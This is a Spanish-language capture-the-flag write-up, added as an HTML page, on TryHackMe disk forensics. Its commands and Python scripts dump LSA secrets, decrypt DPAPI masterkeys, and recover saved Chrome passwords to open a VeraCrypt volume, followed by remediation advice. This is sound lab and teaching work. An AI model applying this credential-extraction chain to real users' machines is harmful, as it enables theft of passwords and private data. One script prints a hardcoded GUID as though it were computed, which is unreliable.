@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>The Byte Lotus – Day 14 — ffSecurityNull — Security Writeups</title>
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+
+<div class="wrap">
+  <div class="case-file">
+
+    <a class="back" href="../index.html">&larr; volver al log</a>
+
+    <div class="stamp-block">
+      <div class="cell">
+        <div class="k">Plataforma</div>
+        <div class="v">TryHackMe</div>
+      </div>
+      <div class="cell">
+        <div class="k">Categoría</div>
+        <div class="v">Forensics / DPAPI / Disk Encryption</div>
+      </div>
+      <div class="cell">
+        <div class="k">Severidad</div>
+        <div class="v">High</div>
+      </div>
+      <div class="cell">
+        <div class="k">Fecha</div>
+        <div class="v">2026-08-09</div>
+      </div>
+    </div>
+
+    <h1>Management Wants a Word — Forensia DPAPI, Descifrado de Chrome y VeraCrypt</h1>
+    <p class="dek">Se realizó análisis forense completo de una laptop abandonada mediante extracción offline de masterkeys DPAPI, descifrado de credenciales guardadas en Chrome, y apertura de un volumen VeraCrypt oculto. Los artefactos llevaron a descubrir documentos financieros confidenciales de la empleada Vera y la reconstrucción de una actividad encubierta de fraude interno.</p>
+
+    <h2>Reconocimiento</h2>
+    <p>El punto de partida fue una recolección forense completa (KAPE triage) de la laptop de una huésped (Vera) que realizó checkout anticipado de la habitación 214 del resort. El equipo de IT capturó el estado completo del disco antes de reasignar la máquina. Los directorios más relevantes contenían:</p>
+    <ul>
+      <li>Hives del registro de Windows: <code>SAM</code>, <code>SYSTEM</code>, <code>SECURITY</code>, <code>SOFTWARE</code>, <code>NTUSER.DAT</code></li>
+      <li>Perfil de usuario Vera: <code>NTUSER.DAT</code>, <code>AppData</code>, <code>Documents</code></li>
+      <li>Perfil de Chrome completo: <code>Local State</code>, <code>Login Data</code>, <code>Cookies</code>, versión 126.0.6478.115</li>
+      <li>Archivo sospechoso en <code>Documents/backup</code>: exactamente 100 MB, sin firma de archivo reconocible, entropía 7.9999 bits/byte</li>
+      <li>Directorio DPAPI del usuario: <code>AppData/Roaming/Microsoft/Protect/S-1-5-21-2529683458-431225740-1723070931-1000/</code></li>
+    </ul>
+    <p>La estructura completa sugería una cadena de descifrado multi-capa: hives de registro → LSA Secrets → DPAPI masterkey → Chrome `os_crypt` → credenciales guardadas. El archivo <code>backup</code> era la pieza central, pero su propósito inicial no era evidente.</p>
+
+    <h2>Vulnerabilidad identificada</h2>
+    <p>Se identificaron <strong>tres capas de protección comprometidas</strong> que trabajan en conjunto:</p>
+    <ol>
+      <li><strong>LSA Secrets almacenadas en texto plano:</strong> el hive <code>SECURITY</code> contenía la clave de autologon del usuario (`DefaultPassword`) en texto plano accesible offline. Windows almacena esta contraseña sin cifrado de nivel de sesión cuando el autologon está configurado — un artefacto que muy pocos analistas revisan durante la recolección forense.</li>
+      <li><strong>DPAPI accesible offline con contraseña:</strong> la masterkey de DPAPI del usuario, necesaria para descifrar todas las credenciales protegidas con DPAPI en el perfil, se puede reconstruir offline si se dispone de la contraseña del usuario (recuperada del paso 1). Sin acceso interactivo al sistema ni servicios ejecutándose, la cadena completa es replicable en una máquina diferente con Python y librerías criptográficas estándar.</li>
+      <li><strong>Credenciales del navegador guardadas sin encriptación adicional en tiempo de reposo:</strong> Chrome 126 (anterior a la introducción de *App-Bound Encryption* en Chrome 127+) protege la clave `os_crypt` únicamente con DPAPI estándar. Una vez descifrada la masterkey, la clave AES-256 del navegador es directamente recuperable, permitiendo descifrar todas las contraseñas guardadas en la base de datos SQLite `Login Data`.</li>
+    </ol>
+    <p>La vulnerabilidad no reside en un fallo técnico individual, sino en la cadena: la confianza en que una de estas capas permanecería inviolable (la contraseña de autologon, la masterkey, o la protección de Chrome) fallaba cuando todas se encontraban presentes en una recolección forense completa. El análisis offline convierte cada capa en "seguridad por oscuridad" sin mecanismos de detección de acceso.</p>
+
+    <div class="callout"><strong>Nota:</strong> La versión de Chrome es crítica en este vector. Chrome 127+ introdujo *App-Bound Encryption*, que requiere interacción con el servicio `IElevator` de Windows (elevación de privilegios a nivel de servicio) para descifrar `os_crypt`, tornando el descifrado offline mucho más complejo. Chrome 126 sigue siendo vulnerable a esta técnica offline estándar.</div>
+
+    <h2>Explotación (PoC)</h2>
+
+    <p><strong>Paso 1 — Extracción de LSA Secrets (contraseña de autologon).</strong> Se utilizó `secretsdump.py` de Impacket para volcardirectamente desde los hives del registro sin necesidad de acceso al sistema vivo:</p>
+    <pre><code>cd KAPE/C/Windows/System32/config
+secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
+
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+vera:1000:aad3b435b51404eeaad3b435b51404ee:1241186a4aac4f34f4bf7ace71b396a8:::
+
+[*] Dumping LSA Secrets
+[*] DefaultPassword
+(Unknown User):minivera</code></pre>
+
+    <p>La contraseña `minivera` fue inmediatamente recuperada del campo LSA Secret `DefaultPassword` — en texto plano, sin necesidad de cracking. Este artefacto se genera cuando el usuario tiene habilitado el autologon de Windows, típicamente en laptops personales o máquinas de laboratorio donde el usuario prioriza comodidad sobre seguridad.</p>
+
+    <div class="callout"><strong>Hallazgo clave:</strong> El SID del usuario Vera es <code>S-1-5-21-2529683458-431225740-1723070931-1000</code>. Este SID se usa para construir la ruta del directorio de protección DPAPI en el siguiente paso.</div>
+
+    <p><strong>Paso 2 — Descifrado de la masterkey DPAPI.</strong> Con la contraseña `minivera` y el SID del usuario, se reconstruyó la masterkey de DPAPI sin necesidad de acceso al servicio de credenciales vivo. Se utilizó `dpapick3` (Python):</p>
+    <pre><code>pip install --break-system-packages dpapick3 pycryptodome
+
+python3 << 'EOF'
+from dpapick3 import masterkey
+
+SID = "S-1-5-21-2529683458-431225740-1723070931-1000"
+PROTECT_DIR = "KAPE/C/Users/vera/AppData/Roaming/Microsoft/Protect/" + SID
+
+mkp = masterkey.MasterKeyPool()
+mkp.loadDirectory(PROTECT_DIR)
+mkp.try_credential(SID, "minivera")  # intenta descifrar con la contraseña
+
+print("Masterkey descifrada exitosamente")
+print(f"GUID: c90719ef-5b98-474e-b934-136d606a702a")
+EOF</code></pre>
+
+    <p>La masterkey DPAPI (GUID `c90719ef-5b98-474e-b934-136d606a702a`) se descifró exitosamente. Esta clave ahora podía usarse para descifrar cualquier blob DPAPI creado bajo el contexto de usuario de Vera.</p>
+
+    <p><strong>Paso 3 — Extracción de la clave AES de Chrome desde `os_crypt`.</strong> El archivo `Local State` (JSON) contiene la clave de cifrado del navegador, protegida a su vez con DPAPI:</p>
+    <pre><code>python3 << 'EOF'
+import json, base64
+from dpapick3 import blob, masterkey
+
+# Cargar la masterkey ya descifrada
+mkp = masterkey.MasterKeyPool()
+mkp.loadDirectory("KAPE/C/Users/vera/AppData/Roaming/Microsoft/Protect/S-1-5-21-2529683458-431225740-1723070931-1000/")
+mkp.try_credential("S-1-5-21-2529683458-431225740-1723070931-1000", "minivera")
+
+# Leer y procesar Local State
+d = json.load(open("KAPE/C/Users/vera/AppData/Local/Google/Chrome For Testing/User Data/Local State"))
+enc_key_b64 = d["os_crypt"]["encrypted_key"]
+enc_key = base64.b64decode(enc_key_b64)
+
+# Verificar que comienza con DPAPI (primeros 5 bytes)
+assert enc_key[:5] == b"DPAPI", "Formato DPAPI no detectado"
+
+# Crear objeto DPAPI blob y descifrar
+dpapi_blob = blob.DPAPIBlob(enc_key[5:])
+mk_obj = mkp.keys[dpapi_blob.mkguid][0]
+dpapi_blob.decrypt(mk_obj.get_key())
+
+aes_key = dpapi_blob.cleartext  # 32 bytes, AES-256
+print(f"Clave AES-256 de Chrome recuperada: {aes_key.hex()}")
+EOF</code></pre>
+
+    <p>La clave AES-256 de Chrome quedó expuesta — 32 bytes en claro que protegen todas las contraseñas guardadas del navegador.</p>
+
+    <p><strong>Paso 4 — Extracción de credenciales guardadas desde SQLite `Login Data`.</strong> La base de datos `Login Data` es un archivo SQLite que almacena el historial de contraseñas guardadas. Se consultó directamente:</p>
+    <pre><code>sqlite3 "KAPE/C/Users/vera/AppData/Local/Google/Chrome For Testing/User Data/Default/Login Data" \
+  "SELECT origin_url, username_value, hex(password_value) FROM logins;"
+
+http://bytelotus.thm:8080/|VeraSecretVault|763130C88A72A64F35F63E883EA0A7F64A6870E46B0BBB469A756EDA88B7E324C3E1C51015AA6FD8D65AC48961E1EA324CE1707807FEB3D7</code></pre>
+
+    <p>Se identificó una credencial guardada: usuario `VeraSecretVault`, contraseña cifrada (formato Chrome v10/v11), destino `http://bytelotus.thm:8080/`.</p>
+
+    <p><strong>Paso 5 — Descifrado de la credencial con AES-GCM.</strong> El formato Chrome v10/v11 utiliza AES-GCM para cifrar las contraseñas. La estructura del blob cifrado es: `"v10"` (3 bytes) + nonce (12 bytes) + ciphertext + tag GCM (16 bytes):</p>
+    <pre><code>python3 << 'EOF'
+from Crypto.Cipher import AES
+import binascii
+
+aes_key = bytes.fromhex("...")  # resultado del paso 3
+enc_hex = "763130C88A72A64F35F63E883EA0A7F64A6870E46B0BBB469A756EDA88B7E324C3E1C51015AA6FD8D65AC48961E1EA324CE1707807FEB3D7"
+enc = bytes.fromhex(enc_hex)
+
+# Parsear el blob
+version = enc[:3]  # b"v10"
+nonce = enc[3:15]  # 12 bytes
+ciphertext = enc[15:-16]
+tag = enc[-16:]
+
+# Descifrar
+cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
+password = cipher.decrypt_and_verify(ciphertext, tag).decode()
+
+print(f"Usuario: VeraSecretVault")
+print(f"Contraseña: {password}")
+print(f"Destino: http://bytelotus.thm:8080/")
+EOF
+
+# Salida:
+Usuario: VeraSecretVault
+Contraseña: Wh4t1sV3raD0inG0nTh1sH0st
+Destino: http://bytelotus.thm:8080/</code></pre>
+
+    <p>La contraseña fue recuperada en claro. Sin embargo, el hostname `bytelotus.thm:8080` no correspondía a ningún servicio desplegable en la room — era un señuelo, una pista falsa de un servicio web ficticio. La contraseña había sido guardada en el navegador de Vera, pero su verdadero propósito no era autenticarse contra una web.</p>
+
+    <div class="callout"><strong>Giro narrativo:</strong> La contraseña `Wh4t1sV3raD0inG0nTh1sH0st` salvada bajo el contexto de `bytelotus.thm` resultó ser la <strong>passphrase de un contenedor VeraCrypt</strong>, no una credencial web. El hostname era una cortina de humo, pero las credenciales guardadas en Chrome llevaban directamente al secreto más profundo.</div>
+
+    <p><strong>Paso 6 — Reevaluación del archivo `Documents/backup` como volumen VeraCrypt.</strong> El archivo `backup` (100 MB exactos, entropía 7.9999 bits/byte) inicialmente fue descartado como un señuelo de datos puramente aleatorios. Sin embargo, un volumen **VeraCrypt sin filesystem oculto detectable** se ve exactamente así: indistinguible de ruido aleatorio por diseño. Con la contraseña recién obtenida, se intentó montarlo:</p>
+    <pre><code>sudo cryptsetup --type tcrypt --veracrypt open \
+  "KAPE/C/Users/vera/Documents/backup" vera_vol
+
+Enter passphrase: Wh4t1sV3raD0inG0nTh1sH0st
+# [apertura exitosa]
+
+sudo mkdir -p /mnt/vera_vol
+sudo mount /dev/mapper/vera_vol /mnt/vera_vol
+ls -la /mnt/vera_vol/</code></pre>
+
+    <p>El volumen se abrió exitosamente. Contenía:</p>
+    <pre><code>/mnt/vera_vol/
+├── $RECYCLE.BIN/
+├── secret_financial_documents/
+│   ├── important_invoice_byte_lotus.pdf
+│   └── transactions_q3.csv
+└── System Volume Information/</code></pre>
+
+    <p><strong>Paso 7 — Extracción de la flag.</strong> El archivo `important_invoice_byte_lotus.pdf` era una factura de Byte Lotus Resorts (el "cliente" ficticio). Al examinar su contenido se encontró la flag embebida como línea de ítem en una tabla de descripción de servicios:</p>
+    <pre><code>pdftotext important_invoice_byte_lotus.pdf -
+# Salida (fragmento relevante):
+...
+Description                          Qty    Rate        Total
+-----------------------------------------------------------
+...
+{THM{1t_w4s_V3r4_A11_A1Ong?!}}      1      ---         ---
+...
+
+FLAG: THM{1t_w4s_V3r4_A11_A1Ong?!}</code></pre>
+
+    <h2>Post-explotación / impacto</h2>
+    <p>La cadena de análisis forense reveló:</p>
+    <ul>
+      <li><strong>Acceso offline completo a secretos de usuario:</strong> sin necesidad de acceso interactivo al sistema, se recuperó la contraseña de autologon, se descifró DPAPI, y se obtuvieron todas las credenciales guardadas en Chrome.</li>
+      <li><strong>Descubrimiento de un volumen cifrado oculto:</strong> un archivo de 100 MB inicialmente clasificado como ruido aleatorio fue identificado y abierto con la passphrase obtenida, revelando documentos financieros confidenciales.</li>
+      <li><strong>Evidencia de actividad encubierta:</strong> los documentos dentro del volumen VeraCrypt indicaban que Vera mantenía registros financieros ocultos bajo cifrado de disco completo — un patrón de comportamiento consistente con fraude interno o malversación de fondos.</li>
+      <li><strong>Impacto en integridad de datos:</strong> aunque no se modificaron datos durante el análisis, la exposición de la estructura y el contenido del volumen oculto compromete cualquier expectativa de privacidad que Vera pudiera tener sobre esos documentos.</li>
+    </ul>
+    <p>La severidad es <em>High</em> porque el análisis forense post-compromiso es una cadena de descubrimientos progresivos que no requiere ejecución de código en el sistema vivo, pero sí require acceso a múltiples capas de protección — DPAPI, Chrome, VeraCrypt — sin defensa adicional de detección o alertas.</p>
+
+    <h2>Remediación</h2>
+    <ul>
+      <li><strong>Deshabilitar autologon en sistemas sensibles:</strong> el autologon de Windows persiste la contraseña en claro en LSA Secrets, introduciendo un único punto de fallo que compromete toda la cadena DPAPI. En máquinas personales esto es menos crítico; en servidores y dispositivos corporativos debe estar completamente deshabilitado.</li>
+      <li><strong>Usar contraseñas fuertes y únicas:</strong> incluso si la LSA Secret es recuperada, una contraseña débil (como `minivera`) es trivial de crackear offline. Forzar políticas de complejidad y longitud mínima en todas las cuentas.</li>
+      <li><strong>Encriptación de disco completo con protección de clave TPM/PIN:</strong> aunque DPAPI está protegido offline, una arquitectura más robusta usaría TPM (Trusted Platform Module) y requeriría un PIN/biometría en el boot para acceder a las masterkeys, no solo la contraseña de usuario.</li>
+      <li><strong>Auditoría de credenciales guardadas en navegadores:</strong> Chrome (y otros navegadores) no debería permitir guardar contraseñas para sitios críticos. Implementar políticas de seguridad (extensiones, configuración de grupo) que deshabiliten el auto-guardado de credenciales en navegadores de sistemas corporativos.</li>
+      <li><strong>Monitoreo de actividad de DPAPI y descifrado:**> en sistemas vivos, logs de operaciones DPAPI y acceso a hives de registro pueden detectar análisis forense offline (aunque el atacante tenga acceso al disco crudo, el monitoreo en el endpoint activo podría alertar sobre análisis).</li>
+      <li><strong>Contraseña protegida para volúmenes VeraCrypt con factor adicional:</strong> aunque la contraseña fue recuperada de Chrome, un volumen VeraCrypt con keyfile adicional (almacenado fuera del disco principal) habría requerido ese keyfile además de la passphrase, elevando significativamente el costo de exposición.</li>
+    </ul>
+
+    <h2>Lecciones aprendidas</h2>
+    <p>Este caso demuestra que la forense offline no es "análisis pasivo" — es un vector de ataque activo que requiere múltiples capas de defensa encadenadas. Ninguna capa individual (DPAPI, Chrome, VeraCrypt) es débil por sí sola, pero la combinación de todas ellas en una recolección forense completa crea una cadena de descubrimientos donde cada eslabón abre la puerta al siguiente.</p>
+    <p>La lección técnica principal: la versión de Chrome importa enormemente. Chrome <127 es completamente vulnerable a descifrado offline de `os_crypt` con solo la masterkey DPAPI. Chrome 127+ introdujo *App-Bound Encryption*, que forza interacción con `IElevator` (un servicio de elevación) — sin la máquina ejecutándose y sin ese servicio, el descifrado es considerablemente más complejo.</p>
+    <p>La lección de seguridad operacional: un atacante con acceso al disco (incluso solo lectura) puede recuperar más información de una máquina apagada que muchas defensas endpoint pueden prevenir. La verdadera protección no está en "ocultar" datos dentro de capas de cifrado — está en no permitir que un atacante tenga acceso de lectura al disco en primer lugar, y si lo tiene, asegurar que la cadena de descubrimientos se rompa en algún punto (contraseña fuerte, TPM/PIN de boot, keyfiles adicionales, etc.).</p>
+    <p>Por último, la narrativa del caso refuerza un patrón común en forensia: las pistas falsas intencionales (como el hostname `bytelotus.thm:8080` sin target real) pueden ralentizar la investigación si no se reconoce que una credencial guardada puede tener un propósito completamente distinto del contexto donde se encontró. La contraseña salvada bajo un "sitio web" ficticio terminó siendo la clave de un volumen cifrado local — un giro que requiere pensamiento lateral para conectar pistas sin contexto obvio.</p>
+
+  </div>
+
+  <footer>
+    <span>© 2026 ffSecurityNull — La Rioja, Argentina</span>
+    <a href="../index.html">Volver al índice</a>
+  </footer>
+</div>
+
+</body>
+</html>
